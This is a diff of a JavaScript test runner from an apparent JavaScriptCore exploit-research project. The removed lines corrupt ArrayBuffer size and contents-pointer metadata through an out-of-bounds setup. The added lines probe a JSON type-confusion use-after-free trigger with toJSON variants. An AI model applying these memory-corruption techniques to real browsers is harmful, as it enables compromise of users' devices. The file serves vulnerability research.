@@ -1,71 +1,122 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-import { executeCorruptArrayBufferMetadataTest } from './testCorruptMetadata.mjs'; 
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
-import { AdvancedInt64, toHex } from '../utils.mjs';
+import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
 
-async function runAggressiveMetadataCorruptionTestsWithActiveCheck() {
-    const FNAME_RUNNER = "runAggressiveMetadataCorruptionTestsWithActiveCheck";
-    logS3(`==== INICIANDO Testes Agressivos de Corrupção de Metadados AB (com Verificação Ativa) ====`, 'test', FNAME_RUNNER); // [cite: 2486]
-    
-    // Teste 1: Tentar corromper o TAMANHO do oob_array_buffer_real
-    const offsetCorromperTamanho = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16); // [cite: 2487, 2450]
-    logS3(`\n--- Testando Corrupção de Tamanho do ArrayBuffer (Offset: ${toHex(offsetCorromperTamanho)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2488]
-    await executeCorruptArrayBufferMetadataTest(
-        "Corrupt_AB_Size_to_Large_ActiveCheck",
-        offsetCorromperTamanho, 
-        0x7FFFFFFF,             
-        4,                      
-        false                   // isPointerCorruptionTest = false // [cite: 2489]
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2490]
+// --- Funções toJSON para teste de decomposição ULTRA MINIMALISTA ---
 
-    // Teste 2: Corromper o PONTEIRO DE CONTEÚDO para Nulo e tentar ler
-    const offsetCorromperConteudoPtr = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16); // [cite: 2491, 2454]
-    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Anular) e TENTAR LER (Offset: ${toHex(offsetCorromperConteudoPtr)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2491]
-    await executeCorruptArrayBufferMetadataTest(
-        "Corrupt_AB_ContentsPtr_to_Null_And_Read",
-        offsetCorromperConteudoPtr, 
-        new AdvancedInt64(0,0),   
-        8,                        
-        true                      // isPointerCorruptionTest = true // [cite: 2492]
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2493]
-    
-    // Teste 3: Corromper o PONTEIRO DE CONTEÚDO para Dummy e tentar ler
-    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Dummy) e TENTAR LER (Offset: ${toHex(offsetCorromperConteudoPtr)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2494]
-    await executeCorruptArrayBufferMetadataTest(
-        "Corrupt_AB_ContentsPtr_to_Dummy_And_Read",
-        offsetCorromperConteudoPtr, 
-        new AdvancedInt64("0x4141414142424242"), 
-        8,                        
-        true                      // isPointerCorruptionTest = true // [cite: 2495]
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2495]
+// Variante 0: Absolutamente Mínima (apenas return {})
+// Não incrementa contador nem muda título para isolar o ato de ser chamada e retornar.
+function toJSON_Decomp_V0_ReturnEmptyObject() {
+    // current_toJSON_call_count_for_TypeError_test++; // O contador será 0 se o erro for antes
+    // document.title = `toJSON_Decomp_V0 Call`;
+    return {}; 
+}
 
-    logS3(`==== Testes Agressivos de Corrupção de Metadados (com Verificação Ativa) CONCLUÍDOS ====`, 'test', FNAME_RUNNER); // [cite: 2496]
+// Variante 1: Apenas incrementa o contador global e retorna.
+function toJSON_Decomp_V1_CounterOnly() {
+    current_toJSON_call_count_for_TypeError_test++;
+    // document.title = `toJSON_Decomp_V1 Call ${current_toJSON_call_count_for_TypeError_test}`;
+    return { step: 1, call: current_toJSON_call_count_for_TypeError_test };
+}
+
+// Variante 2: Apenas muda document.title e retorna.
+function toJSON_Decomp_V2_TitleOnly() {
+    current_toJSON_call_count_for_TypeError_test++; // Contar a entrada
+    document.title = `toJSON_Decomp_V2 Call ${current_toJSON_call_count_for_TypeError_test}`;
+    return { step: 2, call: current_toJSON_call_count_for_TypeError_test };
+}
+
+// Variante 3: Apenas uma operação matemática local e retorna.
+function toJSON_Decomp_V3_LocalMathOnly() {
+    current_toJSON_call_count_for_TypeError_test++;
+    document.title = `toJSON_Decomp_V3 Call ${current_toJSON_call_count_for_TypeError_test}`;
+    let x = 1 + 1; // Operação puramente local
+    return { step: 3, res: x, call: current_toJSON_call_count_for_TypeError_test };
+}
+
+// Variante 4 (Referência do problema anterior): Tentativa de logS3
+// Esta é para confirmar se o logS3 ainda é o gatilho como suspeitado.
+function toJSON_Decomp_V4_AttemptLogS3() {
+    current_toJSON_call_count_for_TypeError_test++;
+    const FNAME_toJSON = "toJSON_Decomp_V4_AttemptLogS3_Internal";
+    document.title = `toJSON_Decomp_V4 Call ${current_toJSON_call_count_for_TypeError_test}`;
+    try {
+        // Esta linha era o ponto de falha nos logs anteriores
+        logS3(`[${FNAME_toJSON}] Chamada ${current_toJSON_call_count_for_TypeError_test}! this: ${typeof this}`, "critical", FNAME_toJSON);
+    } catch (e) {
+        console.error("ERRO DENTRO de toJSON_Decomp_V4_AttemptLogS3 ao chamar logS3:", e);
+        document.title = "ERRO INTERNO toJSON_Decomp_V4";
+        throw e; // Re-lançar para ser pego pelo catch em executeFocusedTestForTypeError
+    }
+    return { step: 4, logged: true, call: current_toJSON_call_count_for_TypeError_test };
+}
+
+
+async function runUltraMinimalDecomposition() {
+    const FNAME_RUNNER = "runUltraMinimalDecomposition";
+    logS3(`==== INICIANDO Decomposição Ultra-Minimalista do Gatilho do TypeError ====`, 'test', FNAME_RUNNER);
+
+    const tests = [
+        { description: "Decomp_V0_ReturnEmptyObject", func: toJSON_Decomp_V0_ReturnEmptyObject },
+        { description: "Decomp_V1_CounterOnly", func: toJSON_Decomp_V1_CounterOnly },
+        { description: "Decomp_V2_TitleOnly", func: toJSON_Decomp_V2_TitleOnly },
+        { description: "Decomp_V3_LocalMathOnly", func: toJSON_Decomp_V3_LocalMathOnly },
+        { description: "Decomp_V4_AttemptLogS3", func: toJSON_Decomp_V4_AttemptLogS3 },
+    ];
+
+    for (const test of tests) {
+        logS3(`\n--- Testando Variante toJSON Ultra-Minimalista: ${test.description} ---`, 'subtest', FNAME_RUNNER);
+        document.title = `Iniciando SubTeste: ${test.description}`; 
+        
+        const result = await executeFocusedTestForTypeError( // Chama a função do outro arquivo
+            test.description,
+            test.func 
+        );
+        
+        if (result.errorOccurred) {
+            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
+        } else if (result.potentiallyCrashed) {
+            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
+        } else {
+            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
+        }
+        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+        // Se um TypeError ocorrer, ele será capturado e logado.
+        // Vamos continuar para testar todas as variantes, a menos que seja um crash completo.
+        if (document.title.startsWith("CONGELOU?")) {
+            logS3("Congelamento detectado, interrompendo próximos testes de decomposição.", "error", FNAME_RUNNER);
+            break;
+        }
+    }
+
+    logS3(`==== Decomposição Ultra-Minimalista do Gatilho do TypeError CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_AggressiveCorrupt_ActiveCheck';
+    const FNAME = 'runAllAdvancedTestsS3_UltraMinimalDecomp';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
-    if (runBtn) runBtn.disabled = true; // [cite: 2498]
-    if (outputDiv) outputDiv.innerHTML = ''; // [cite: 2498]
+    if (runBtn) runBtn.disabled = true;
+    if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Testes Agressivos de Corrupção de Metadados AB (com Verificação Ativa) ====`,'test', FNAME); // [cite: 2499]
-    document.title = "Iniciando Script 3 - Corrupção Agressiva AB (Verificação Ativa)"; // [cite: 2499]
+    logS3(`==== INICIANDO Script 3: Decomposição Ultra-Minimalista do Gatilho do TypeError ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Decomp UltraMinimal";
     
-    await runAggressiveMetadataCorruptionTestsWithActiveCheck(); // [cite: 2500]
+    await runUltraMinimalDecomposition();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Testes Agressivos de Corrupção de Metadados AB com Verificação Ativa) ====`,'test', FNAME); // [cite: 2501]
-    if (runBtn) runBtn.disabled = false; // [cite: 2501]
-    // Ajuste no título final para refletir o estado real
-    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CRASH")) {
-        // Manter título de erro/crash ou o inicial se nada mudou drasticamente
-    } else {
-        document.title = "Script 3 Concluído - Corrupção Agressiva AB";
+    logS3(`\n==== Script 3 CONCLUÍDO (Decomposição Ultra-Minimalista do Gatilho do TypeError) ====`,'test', FNAME);
+    if (runBtn) runBtn.disabled = false;
+    
+    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
+        // Não sobrescrever
+    } else if (document.title.includes("ERRO")) {
+        // Manter título de erro
+    }
+    else {
+        document.title = "Script 3 Concluído - Decomp UltraMinimal";
     }
 }
